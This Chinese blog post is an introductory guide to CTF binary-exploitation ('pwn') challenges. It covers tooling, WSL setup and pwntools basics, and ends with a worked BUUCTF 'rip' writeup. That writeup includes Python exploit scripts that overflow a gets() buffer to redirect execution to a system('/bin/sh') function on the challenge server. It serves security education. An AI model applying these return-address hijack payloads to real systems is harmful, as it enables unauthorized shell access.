{"title":"Pwn从0到0.00001","date":"2021-12-13T07:47:18.000Z","toc":true,"source":"_posts/Pwn-zero2something.md","raw":"---\ntitle: Pwn从0到0.00001\ndate: 2021-12-13 15:47:18\ntoc: true\ncomments: true\ntags: \n  - CTF\n  - Pwn\n---\n\n# Pwn的简介\n\nPwn是CTF方向中的一种，主要是利用二进制漏洞从而获得getShell(提权)，即获得对方系统权限，从而控制对方电脑。\nPwn是一个黑客语法的俚语词，自\"own\"这个字引申出来的，这个词的含意在于，玩家在整个游戏对战中处在胜利的优势，或是说明竞争对手处在完全惨败的 情形下，这个词习惯上在网络游戏文化主要用于嘲笑竞争对手在整个游戏对战中已经完全被击败（例如：\"You just got pwned!\"）。\n\n名词储备：writeup（指CTF中解题思路过程的文档），exp（exploit，指漏洞利用程序），栈，汇编，Linux等\n\n# Pwn的理论工具准备\n\n###  初学\n\n##### 工具\n\n1. Python 2.x 至于为什么不用python3后面会讲到\n2. Linux Windows用户推荐wsl2或虚拟机，MacOS不太清楚\n3. IDA pro 一个逆向分析工具\n4. [Pwntools](https://docs.pwntools.com/en/latest/install.html) 一个漏洞利用框架工具\n5. [checksec](https://blog.csdn.net/qq_43430261/article/details/105516051) ELF保护分析工具\n\n##### 储备知识\n\n1. C语言\n2. 基础Python2语言，及库的用法\n3. 源/伪代码阅读和BUG漏洞寻找能力\n4. 基础Linux命令\n\n以上可以进行简单的栈溢出的学习\n\n### 入门\n\n##### 工具\n\n1. [pwndbg](https://github.com/pwndbg/pwndbg) gdb动态调试插件\n2. [Libcsearcher](https://github.com/lieanu/LibcSearcher) 集成libc查找工具\n3. [one_gadget](https://github.com/david942j/one_gadget) 一句话提权指令搜索工具\n4. [ROPgadget](https://blog.csdn.net/weixin_30414635/article/details/98030954) rop指令流搜索\n\n##### 储备知识\n\n1. C/C++语言\n2. 基础Python2语言，及库的用法\n3. ELF文件结构\n4. 深度理解计算机系统（CSAPP）初步\n\n加上以上的可以更方便的学习进阶栈溢出、堆利用等知识\n\n# Pwn的学习\n\n### 初学-从Writeup中学习\n\n网站推荐\n\n1. [Xctf攻防世界](https://adworld.xctf.org.cn/task?now_checked_num=2&name=pwn) 站内内置writeup，但最近pwn环境无法分发\n2. [Bugku](https://ctf.bugku.com/challenges/index/gid/1/tid/8.html) pwn环境可以分发，但需要自行查找writeup，题量少\n3. [buuctf](https://buuoj.cn/) pwn环境可以分发，有N1BOOK配套习题（但好像环境坏了？），比赛真题，题量大，但需要自行查找writeup\n\n### 入门-从比赛中学习\n\n参加比赛，利用比赛同时练习技术，这样可以更好的抓住比赛的中pwn的热点，也可以培养随机应变的能力。\n\n# Pwn的环境准备\n\n由于没有尝试过MacOS上pwn\n所以只有Windows的教程\n\n### Windows\n\n1. 安装WSL2（子系统） [https://docs.microsoft.com/zh-cn/windows/wsl/install-win10](https://docs.microsoft.com/zh-cn/windows/wsl/install-win10)\n2. 在WSL中安装Python2 [https://www.cnblogs.com/dancesir/p/14201267.html](https://www.cnblogs.com/dancesir/p/14201267.html)\n3. 在WSL中安装pwntools等库[https://docs.pwntools.com/en/latest/install.html](https://docs.pwntools.com/en/latest/install.html)\n4. 在WSL中安装checksec [https://www.cnblogs.com/luocodes/p/13894106.html](https://www.cnblogs.com/luocodes/p/13894106.html)\n5. 选择一个你喜欢的IDE，强推[VSCode](https://code.visualstudio.com/)\n\n##### 在Vscode中配置Pwn中环境\n\n安装Remote - WSL插件\n\n![11111](https://img-blog.csdnimg.cn/20210605202817993.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTAwNDUxMw==,size_16,color_FFFFFF,t_70)\n即可可切换成Ubuntu终端\n![ssss](https://img-blog.csdnimg.cn/20210606012526558.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTAwNDUxMw==,size_16,color_FFFFFF,t_70)\n\n###### 在Vscode中Pwn\n\n 1.右键-在Vscode中打开文件夹\n\n![在Vscode中打开文件夹](https://img-blog.csdnimg.cn/20210605205021437.png)\n2.左下角点击><旋转Reopen Folder in WSL （这个尝试过编写exp时没有代码提示，可以在windows上先装python2和pwntools，在windows上编写exp，然后再Linux上运行，即跳过此步骤）\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20210605205106771.png)\n![reopen](https://img-blog.csdnimg.cn/20210605205146255.png)\n\n3.新建一个exp.py\n![exp](https://img-blog.csdnimg.cn/2021060520552090.png)\n4.开始书写你的脚本\n![ok](https://img-blog.csdnimg.cn/20210605205553278.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTAwNDUxMw==,size_16,color_FFFFFF,t_70)\n\n### Pwntools的学习\n\n官方文档[https://docs.pwntools.com/en/latest/intro.html](https://docs.pwntools.com/en/latest/intro.html)\n\n##### 简易快速入门\n\n导入Pwntools\n`from pwn import *`\n链接\n`r = remote(\"目标地址str类型\", 目标端口int类型)`与服务器交互\n`r = process(\"目标程序位置\")`与本地程序交互\n构造playload之打包\n`p64(int)`将int类型打包成64位存储\n`p32(int)`将int类型打包成32位存储\n发送\n`r.sendline(playload)`发送playload为一行（自动在尾部加上\\n）\n接收\n`r.recv()`接收到结束\n`r.recvuntil(end, drop=True)`end(str)接受到end之后截至，drop=True时不包括end，drop=False时包括end\n打开交互\n`r.interactive()`一般在末尾都要加\n\n# Pwn的做题流程\n\n1. 使用checksec检查ELF文件保护开启的状态\n2. IDApro逆向分析程序漏洞（逻辑复杂的可以使用动态调试）\n3. 编写python的exp脚本进行攻击\n4. （若攻击不成功）进行GDB动态调试，查找原因\n5. （若攻击成功）获取flag，编写Writeup\n   注：此做题流程并不完全概括，需要具体情况具体分析\n\n# Pwn的简单例子\n\n题目来源[【BUUCTF PWN】rip](https://buuoj.cn/challenges#rip)\n\n### checksec\n\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20210605215004844.png)\n64位，导入IDA 64，找到main函数，按F5或是Tab\n\n### 分析函数及漏洞\n\n##### main函数\n\n![main](https://img-blog.csdnimg.cn/20210606001412491.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTAwNDUxMw==,size_16,color_FFFFFF,t_70)\nmain函数中存在gets(无限读入字符串漏洞)，没有开canary可以自由栈溢出\n双击s变量，进入main函数栈区\n![stack](https://img-blog.csdnimg.cn/20210606002336319.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTAwNDUxMw==,size_16,color_FFFFFF,t_70)\n发现s参数位置距离main函数返回地址距离是0xF+0x8个字节\n（位于000000000处的s是存上一个ebp的值，用于恢复上一个函数，位于0000000008处的r是这个函数的返回地址）\n只需要覆盖返回地址r，使它变成我们想要的函数地址，就可以劫持程序，让程序执行完main就执行我们想要的函数（这个题目就是fun函数）。\n\n##### fun函数\n\n![fun](https://img-blog.csdnimg.cn/20210606001433970.png)\nsystem函数可以执行命令，/bin/sh是执行Linux的命令行程序，也就是可以getshell（提权）\n按Tab+Space\n![aa](https://img-blog.csdnimg.cn/20210606002958267.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTAwNDUxMw==,size_16,color_FFFFFF,t_70)\n查看fun函数的开始地址（图中0x0401186位置）\n\n### 编写exp\n\n```python\nfrom pwn import *\n\nr = process('./pwn1') # 调试时使用本地链接\n\np1 = \"a\"*(0xf + 0x8) + p64(0x0401186) \n# 覆盖到r前面之后，将0x0401186打包，覆盖main函数返回地址\n\nr.sendline(p1) # 发送playload\n\nr.interactive() # 开启交互\n```\n\n运行\n![000](https://img-blog.csdnimg.cn/202106060037015.png)\n并没有打通\n需要平衡栈帧（初学可以跳过这个，直接记住结论）\n即需要多return一次\nx86汇编中 ret的指令类似于 先pop（弹出）一个值然后jmp（跳转）到这个值的位置继续执行\n所以寻找一个ret的地址\n![ret](https://img-blog.csdnimg.cn/20210606004505446.png)\n在main函数的结尾就有个retn\n故修改exp\n\n```python\nfrom pwn import *\n\nr = process('./pwn1') # 调试时使用本地链接\n\np1 = \"a\"*(0xf + 0x8) + p64(0x0401185) + p64(0x0401186) \n# 覆盖到r前面之后，先覆盖main函数返回地址为retn，再将0x0401186打包，覆盖retn的返回地址\n\nr.sendline(p1) # 发送playload\n\nr.interactive() # 开启交互\n```\n\n![show](https://img-blog.csdnimg.cn/20210606004624249.png)\n发现`ls`(linux中查看当前文件夹内容的命令)命令可以执行\n再修改exp链接靶机\n\n```python\nfrom pwn import *\n\nr = remote(\"node3.buuoj.cn\", 29885) # 正式攻击时与靶机交互\n# r = process('./pwn1')\n\np1 = \"a\"*(0xf + 0x8) + p64(0x0401185) + p64(0x0401186)\n\nr.sendline(p1)\n\nr.interactive()\n```\n\n再次运行\n![sss](https://img-blog.csdnimg.cn/20210606005015347.png)\n获取flag\n`cat`(linux中直接输出文件内容的命令)\n到此就可以庆祝一下提交flag了\n\n### 编写Writeup\n\n提交完flag之后别忘了编写Writeup，Writeup是指记录解题思路的文档，一个小队开一个公共编辑的文档，一旦做出来题目就要将解题思路、exp、部分截图写入文档，因为一般赛事最后需要提交Writeup，以确保你不是py得到的flag\n\n# Pwn的常见漏洞\n\n### 栈溢出\n\n1. `gets();`无限字符读入\\n停止\n2. `scanf(\"%s\");`无限字符读入\\n停止\n3. `read(0,buf,0x200);`buf位置到返回地址距离小于0x200\n\n### 数组下标溢出\n\n1. 没有判断上界或下界，配合读入或输出，可以任意位置读入或输出\n\n### 格式化字符串\n\n1. 主要利用`printf`的格式化字符串漏洞，实现栈区内读写\n\n### 堆利用\n\n1. UAF(Use After Free)\n2. 劫持__malloc_hook\n3. 修改__IO_1_2_stdout\n\n# 小结\n\n1. 学习Pwn不仅有利于网安方向的同学，还有利于搞开发等同学，因为可以接触更加底层的东西，提高自己网络安全意识\n2. 刚开始学习Pwn是摸着黑，照猫画虎的，只有不断的理解原理才能独立想出解题方法\n3. 为什么不使用Python3？因为这是个坑，我刚开始尝试的是后就因为python3多了个bytes类型，导致p64()的结果不能直接与str相加，而其中有很多不可见字符，最终放弃了Python3。Python2中bytes值以str形式存储的可以直接与str相加。\n4. Pwn的世界错综复杂，我依然还在摸索，一起加油。\n","slug":"Pwn-zero2something","published":true,"updated":"2025-10-28T08:00:40.755Z","_id":"cuid9QqLm14KxyETXWGCpDHCy","comments":true,"layout":"post","photos":[],"html":"<h1 id=\"Pwn的简介\"><a href=\"#Pwn的简介\" class=\"headerlink\" title=\"Pwn的简介\"></a>Pwn的简介</h1><p>Pwn是CTF方向中的一种，主要是利用二进制漏洞从而获得getShell(提权)，即获得对方系统权限，从而控制对方电脑。<br>Pwn是一个黑客语法的俚语词，自”own”这个字引申出来的，这个词的含意在于，玩家在整个游戏对战中处在胜利的优势，或是说明竞争对手处在完全惨败的 情形下，这个词习惯上在网络游戏文化主要用于嘲笑竞争对手在整个游戏对战中已经完全被击败（例如：”You just got pwned!”）。</p>\n<p>名词储备：writeup（指CTF中解题思路过程的文档），exp（exploit，指漏洞利用程序），栈，汇编，Linux等</p>\n<h1 id=\"Pwn的理论工具准备\"><a href=\"#Pwn的理论工具准备\" class=\"headerlink\" title=\"Pwn的理论工具准备\"></a>Pwn的理论工具准备</h1><h3 id=\"初学\"><a href=\"#初学\" class=\"headerlink\" title=\"初学\"></a>初学</h3><h5 id=\"工具\"><a href=\"#工具\" class=\"headerlink\" title=\"工具\"></a>工具</h5><ol>\n<li>Python 2.x 至于为什么不用python3后面会讲到</li>\n<li>Linux Windows用户推荐wsl2或虚拟机，MacOS不太清楚</li>\n<li>IDA pro 一个逆向分析工具</li>\n<li><a href=\"https://docs.pwntools.com/en/latest/install.html\">Pwntools</a> 一个漏洞利用框架工具</li>\n<li><a href=\"https://blog.csdn.net/qq_43430261/article/details/105516051\">checksec</a> ELF保护分析工具</li>\n</ol>\n<h5 id=\"储备知识\"><a href=\"#储备知识\" class=\"headerlink\" title=\"储备知识\"></a>储备知识</h5><ol>\n<li>C语言</li>\n<li>基础Python2语言，及库的用法</li>\n<li>源&#x2F;伪代码阅读和BUG漏洞寻找能力</li>\n<li>基础Linux命令</li>\n</ol>\n<p>以上可以进行简单的栈溢出的学习</p>\n<h3 id=\"入门\"><a href=\"#入门\" class=\"headerlink\" title=\"入门\"></a>入门</h3><h5 id=\"工具-1\"><a href=\"#工具-1\" class=\"headerlink\" title=\"工具\"></a>工具</h5><ol>\n<li><a href=\"https://github.com/pwndbg/pwndbg\">pwndbg</a> gdb动态调试插件</li>\n<li><a href=\"https://github.com/lieanu/LibcSearcher\">Libcsearcher</a> 集成libc查找工具</li>\n<li><a href=\"https://github.com/david942j/one_gadget\">one_gadget</a> 一句话提权指令搜索工具</li>\n<li><a href=\"https://blog.csdn.net/weixin_30414635/article/details/98030954\">ROPgadget</a> rop指令流搜索</li>\n</ol>\n<h5 id=\"储备知识-1\"><a href=\"#储备知识-1\" class=\"headerlink\" title=\"储备知识\"></a>储备知识</h5><ol>\n<li>C&#x2F;C++语言</li>\n<li>基础Python2语言，及库的用法</li>\n<li>ELF文件结构</li>\n<li>深度理解计算机系统（CSAPP）初步</li>\n</ol>\n<p>加上以上的可以更方便的学习进阶栈溢出、堆利用等知识</p>\n<h1 id=\"Pwn的学习\"><a href=\"#Pwn的学习\" class=\"headerlink\" title=\"Pwn的学习\"></a>Pwn的学习</h1><h3 id=\"初学-从Writeup中学习\"><a href=\"#初学-从Writeup中学习\" class=\"headerlink\" title=\"初学-从Writeup中学习\"></a>初学-从Writeup中学习</h3><p>网站推荐</p>\n<ol>\n<li><a href=\"https://adworld.xctf.org.cn/task?now_checked_num=2&name=pwn\">Xctf攻防世界</a> 站内内置writeup，但最近pwn环境无法分发</li>\n<li><a href=\"https://ctf.bugku.com/challenges/index/gid/1/tid/8.html\">Bugku</a> pwn环境可以分发，但需要自行查找writeup，题量少</li>\n<li><a href=\"https://buuoj.cn/\">buuctf</a> pwn环境可以分发，有N1BOOK配套习题（但好像环境坏了？），比赛真题，题量大，但需要自行查找writeup</li>\n</ol>\n<h3 id=\"入门-从比赛中学习\"><a href=\"#入门-从比赛中学习\" class=\"headerlink\" title=\"入门-从比赛中学习\"></a>入门-从比赛中学习</h3><p>参加比赛，利用比赛同时练习技术，这样可以更好的抓住比赛的中pwn的热点，也可以培养随机应变的能力。</p>\n<h1 id=\"Pwn的环境准备\"><a href=\"#Pwn的环境准备\" class=\"headerlink\" title=\"Pwn的环境准备\"></a>Pwn的环境准备</h1><p>由于没有尝试过MacOS上pwn<br>所以只有Windows的教程</p>\n<h3 id=\"Windows\"><a href=\"#Windows\" class=\"headerlink\" title=\"Windows\"></a>Windows</h3><ol>\n<li>安装WSL2（子系统） <a href=\"https://docs.microsoft.com/zh-cn/windows/wsl/install-win10\">https://docs.microsoft.com/zh-cn/windows/wsl/install-win10</a></li>\n<li>在WSL中安装Python2 <a href=\"https://www.cnblogs.com/dancesir/p/14201267.html\">https://www.cnblogs.com/dancesir/p/14201267.html</a></li>\n<li>在WSL中安装pwntools等库<a href=\"https://docs.pwntools.com/en/latest/install.html\">https://docs.pwntools.com/en/latest/install.html</a></li>\n<li>在WSL中安装checksec <a href=\"https://www.cnblogs.com/luocodes/p/13894106.html\">https://www.cnblogs.com/luocodes/p/13894106.html</a></li>\n<li>选择一个你喜欢的IDE，强推<a href=\"https://code.visualstudio.com/\">VSCode</a></li>\n</ol>\n<h5 id=\"在Vscode中配置Pwn中环境\"><a href=\"#在Vscode中配置Pwn中环境\" class=\"headerlink\" title=\"在Vscode中配置Pwn中环境\"></a>在Vscode中配置Pwn中环境</h5><p>安装Remote - WSL插件</p>\n<p><img src=\"https://img-blog.csdnimg.cn/20210605202817993.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTAwNDUxMw==,size_16,color_FFFFFF,t_70\" alt=\"11111\"><br>即可可切换成Ubuntu终端<br><img src=\"https://img-blog.csdnimg.cn/20210606012526558.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTAwNDUxMw==,size_16,color_FFFFFF,t_70\" alt=\"ssss\"></p>\n<h6 id=\"在Vscode中Pwn\"><a href=\"#在Vscode中Pwn\" class=\"headerlink\" title=\"在Vscode中Pwn\"></a>在Vscode中Pwn</h6><p> 1.右键-在Vscode中打开文件夹</p>\n<p><img src=\"https://img-blog.csdnimg.cn/20210605205021437.png\" alt=\"在Vscode中打开文件夹\"><br>2.左下角点击&gt;&lt;旋转Reopen Folder in WSL （这个尝试过编写exp时没有代码提示，可以在windows上先装python2和pwntools，在windows上编写exp，然后再Linux上运行，即跳过此步骤）<br><img src=\"https://img-blog.csdnimg.cn/20210605205106771.png\" alt=\"在这里插入图片描述\"><br><img src=\"https://img-blog.csdnimg.cn/20210605205146255.png\" alt=\"reopen\"></p>\n<p>3.新建一个exp.py<br><img src=\"https://img-blog.csdnimg.cn/2021060520552090.png\" alt=\"exp\"><br>4.开始书写你的脚本<br><img src=\"https://img-blog.csdnimg.cn/20210605205553278.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTAwNDUxMw==,size_16,color_FFFFFF,t_70\" alt=\"ok\"></p>\n<h3 id=\"Pwntools的学习\"><a href=\"#Pwntools的学习\" class=\"headerlink\" title=\"Pwntools的学习\"></a>Pwntools的学习</h3><p>官方文档<a href=\"https://docs.pwntools.com/en/latest/intro.html\">https://docs.pwntools.com/en/latest/intro.html</a></p>\n<h5 id=\"简易快速入门\"><a href=\"#简易快速入门\" class=\"headerlink\" title=\"简易快速入门\"></a>简易快速入门</h5><p>导入Pwntools<br><code>from pwn import *</code><br>链接<br><code>r = remote(&quot;目标地址str类型&quot;, 目标端口int类型)</code>与服务器交互<br><code>r = process(&quot;目标程序位置&quot;)</code>与本地程序交互<br>构造playload之打包<br><code>p64(int)</code>将int类型打包成64位存储<br><code>p32(int)</code>将int类型打包成32位存储<br>发送<br><code>r.sendline(playload)</code>发送playload为一行（自动在尾部加上\\n）<br>接收<br><code>r.recv()</code>接收到结束<br><code>r.recvuntil(end, drop=True)</code>end(str)接受到end之后截至，drop&#x3D;True时不包括end，drop&#x3D;False时包括end<br>打开交互<br><code>r.interactive()</code>一般在末尾都要加</p>\n<h1 id=\"Pwn的做题流程\"><a href=\"#Pwn的做题流程\" class=\"headerlink\" title=\"Pwn的做题流程\"></a>Pwn的做题流程</h1><ol>\n<li>使用checksec检查ELF文件保护开启的状态</li>\n<li>IDApro逆向分析程序漏洞（逻辑复杂的可以使用动态调试）</li>\n<li>编写python的exp脚本进行攻击</li>\n<li>（若攻击不成功）进行GDB动态调试，查找原因</li>\n<li>（若攻击成功）获取flag，编写Writeup<br>注：此做题流程并不完全概括，需要具体情况具体分析</li>\n</ol>\n<h1 id=\"Pwn的简单例子\"><a href=\"#Pwn的简单例子\" class=\"headerlink\" title=\"Pwn的简单例子\"></a>Pwn的简单例子</h1><p>题目来源<a href=\"https://buuoj.cn/challenges#rip\">【BUUCTF PWN】rip</a></p>\n<h3 id=\"checksec\"><a href=\"#checksec\" class=\"headerlink\" title=\"checksec\"></a>checksec</h3><p><img src=\"https://img-blog.csdnimg.cn/20210605215004844.png\" alt=\"在这里插入图片描述\"><br>64位，导入IDA 64，找到main函数，按F5或是Tab</p>\n<h3 id=\"分析函数及漏洞\"><a href=\"#分析函数及漏洞\" class=\"headerlink\" title=\"分析函数及漏洞\"></a>分析函数及漏洞</h3><h5 id=\"main函数\"><a href=\"#main函数\" class=\"headerlink\" title=\"main函数\"></a>main函数</h5><p><img src=\"https://img-blog.csdnimg.cn/20210606001412491.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTAwNDUxMw==,size_16,color_FFFFFF,t_70\" alt=\"main\"><br>main函数中存在gets(无限读入字符串漏洞)，没有开canary可以自由栈溢出<br>双击s变量，进入main函数栈区<br><img src=\"https://img-blog.csdnimg.cn/20210606002336319.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTAwNDUxMw==,size_16,color_FFFFFF,t_70\" alt=\"stack\"><br>发现s参数位置距离main函数返回地址距离是0xF+0x8个字节<br>（位于000000000处的s是存上一个ebp的值，用于恢复上一个函数，位于0000000008处的r是这个函数的返回地址）<br>只需要覆盖返回地址r，使它变成我们想要的函数地址，就可以劫持程序，让程序执行完main就执行我们想要的函数（这个题目就是fun函数）。</p>\n<h5 id=\"fun函数\"><a href=\"#fun函数\" class=\"headerlink\" title=\"fun函数\"></a>fun函数</h5><p><img src=\"https://img-blog.csdnimg.cn/20210606001433970.png\" alt=\"fun\"><br>system函数可以执行命令，&#x2F;bin&#x2F;sh是执行Linux的命令行程序，也就是可以getshell（提权）<br>按Tab+Space<br><img src=\"https://img-blog.csdnimg.cn/20210606002958267.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTAwNDUxMw==,size_16,color_FFFFFF,t_70\" alt=\"aa\"><br>查看fun函数的开始地址（图中0x0401186位置）</p>\n<h3 id=\"编写exp\"><a href=\"#编写exp\" class=\"headerlink\" title=\"编写exp\"></a>编写exp</h3><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\">r = process(<span class=\"string\">&#x27;./pwn1&#x27;</span>) <span class=\"comment\"># 调试时使用本地链接</span></span><br><span class=\"line\"></span><br><span class=\"line\">p1 = <span class=\"string\">&quot;a&quot;</span>*(<span class=\"number\">0xf</span> + <span class=\"number\">0x8</span>) + p64(<span class=\"number\">0x0401186</span>) </span><br><span class=\"line\"><span class=\"comment\"># 覆盖到r前面之后，将0x0401186打包，覆盖main函数返回地址</span></span><br><span class=\"line\"></span><br><span class=\"line\">r.sendline(p1) <span class=\"comment\"># 发送playload</span></span><br><span class=\"line\"></span><br><span class=\"line\">r.interactive() <span class=\"comment\"># 开启交互</span></span><br></pre></td></tr></table></figure>\n\n<p>运行<br><img src=\"https://img-blog.csdnimg.cn/202106060037015.png\" alt=\"000\"><br>并没有打通<br>需要平衡栈帧（初学可以跳过这个，直接记住结论）<br>即需要多return一次<br>x86汇编中 ret的指令类似于 先pop（弹出）一个值然后jmp（跳转）到这个值的位置继续执行<br>所以寻找一个ret的地址<br><img src=\"https://img-blog.csdnimg.cn/20210606004505446.png\" alt=\"ret\"><br>在main函数的结尾就有个retn<br>故修改exp</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\">r = process(<span class=\"string\">&#x27;./pwn1&#x27;</span>) <span class=\"comment\"># 调试时使用本地链接</span></span><br><span class=\"line\"></span><br><span class=\"line\">p1 = <span class=\"string\">&quot;a&quot;</span>*(<span class=\"number\">0xf</span> + <span class=\"number\">0x8</span>) + p64(<span class=\"number\">0x0401185</span>) + p64(<span class=\"number\">0x0401186</span>) </span><br><span class=\"line\"><span class=\"comment\"># 覆盖到r前面之后，先覆盖main函数返回地址为retn，再将0x0401186打包，覆盖retn的返回地址</span></span><br><span class=\"line\"></span><br><span class=\"line\">r.sendline(p1) <span class=\"comment\"># 发送playload</span></span><br><span class=\"line\"></span><br><span class=\"line\">r.interactive() <span class=\"comment\"># 开启交互</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://img-blog.csdnimg.cn/20210606004624249.png\" alt=\"show\"><br>发现<code>ls</code>(linux中查看当前文件夹内容的命令)命令可以执行<br>再修改exp链接靶机</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\">r = remote(<span class=\"string\">&quot;node3.buuoj.cn&quot;</span>, <span class=\"number\">29885</span>) <span class=\"comment\"># 正式攻击时与靶机交互</span></span><br><span class=\"line\"><span class=\"comment\"># r = process(&#x27;./pwn1&#x27;)</span></span><br><span class=\"line\"></span><br><span class=\"line\">p1 = <span class=\"string\">&quot;a&quot;</span>*(<span class=\"number\">0xf</span> + <span class=\"number\">0x8</span>) + p64(<span class=\"number\">0x0401185</span>) + p64(<span class=\"number\">0x0401186</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">r.sendline(p1)</span><br><span class=\"line\"></span><br><span class=\"line\">r.interactive()</span><br></pre></td></tr></table></figure>\n\n<p>再次运行<br><img src=\"https://img-blog.csdnimg.cn/20210606005015347.png\" alt=\"sss\"><br>获取flag<br><code>cat</code>(linux中直接输出文件内容的命令)<br>到此就可以庆祝一下提交flag了</p>\n<h3 id=\"编写Writeup\"><a href=\"#编写Writeup\" class=\"headerlink\" title=\"编写Writeup\"></a>编写Writeup</h3><p>提交完flag之后别忘了编写Writeup，Writeup是指记录解题思路的文档，一个小队开一个公共编辑的文档，一旦做出来题目就要将解题思路、exp、部分截图写入文档，因为一般赛事最后需要提交Writeup，以确保你不是py得到的flag</p>\n<h1 id=\"Pwn的常见漏洞\"><a href=\"#Pwn的常见漏洞\" class=\"headerlink\" title=\"Pwn的常见漏洞\"></a>Pwn的常见漏洞</h1><h3 id=\"栈溢出\"><a href=\"#栈溢出\" class=\"headerlink\" title=\"栈溢出\"></a>栈溢出</h3><ol>\n<li><code>gets();</code>无限字符读入\\n停止</li>\n<li><code>scanf(&quot;%s&quot;);</code>无限字符读入\\n停止</li>\n<li><code>read(0,buf,0x200);</code>buf位置到返回地址距离小于0x200</li>\n</ol>\n<h3 id=\"数组下标溢出\"><a href=\"#数组下标溢出\" class=\"headerlink\" title=\"数组下标溢出\"></a>数组下标溢出</h3><ol>\n<li>没有判断上界或下界，配合读入或输出，可以任意位置读入或输出</li>\n</ol>\n<h3 id=\"格式化字符串\"><a href=\"#格式化字符串\" class=\"headerlink\" title=\"格式化字符串\"></a>格式化字符串</h3><ol>\n<li>主要利用<code>printf</code>的格式化字符串漏洞，实现栈区内读写</li>\n</ol>\n<h3 id=\"堆利用\"><a href=\"#堆利用\" class=\"headerlink\" title=\"堆利用\"></a>堆利用</h3><ol>\n<li>UAF(Use After Free)</li>\n<li>劫持__malloc_hook</li>\n<li>修改__IO_1_2_stdout</li>\n</ol>\n<h1 id=\"小结\"><a href=\"#小结\" class=\"headerlink\" title=\"小结\"></a>小结</h1><ol>\n<li>学习Pwn不仅有利于网安方向的同学，还有利于搞开发等同学，因为可以接触更加底层的东西，提高自己网络安全意识</li>\n<li>刚开始学习Pwn是摸着黑，照猫画虎的，只有不断的理解原理才能独立想出解题方法</li>\n<li>为什么不使用Python3？因为这是个坑，我刚开始尝试的是后就因为python3多了个bytes类型，导致p64()的结果不能直接与str相加，而其中有很多不可见字符，最终放弃了Python3。Python2中bytes值以str形式存储的可以直接与str相加。</li>\n<li>Pwn的世界错综复杂，我依然还在摸索，一起加油。</li>\n</ol>\n","excerpt":"","more":"<h1 id=\"Pwn的简介\"><a href=\"#Pwn的简介\" class=\"headerlink\" title=\"Pwn的简介\"></a>Pwn的简介</h1><p>Pwn是CTF方向中的一种，主要是利用二进制漏洞从而获得getShell(提权)，即获得对方系统权限，从而控制对方电脑。<br>Pwn是一个黑客语法的俚语词，自”own”这个字引申出来的，这个词的含意在于，玩家在整个游戏对战中处在胜利的优势，或是说明竞争对手处在完全惨败的 情形下，这个词习惯上在网络游戏文化主要用于嘲笑竞争对手在整个游戏对战中已经完全被击败（例如：”You just got pwned!”）。</p>\n<p>名词储备：writeup（指CTF中解题思路过程的文档），exp（exploit，指漏洞利用程序），栈，汇编，Linux等</p>\n<h1 id=\"Pwn的理论工具准备\"><a href=\"#Pwn的理论工具准备\" class=\"headerlink\" 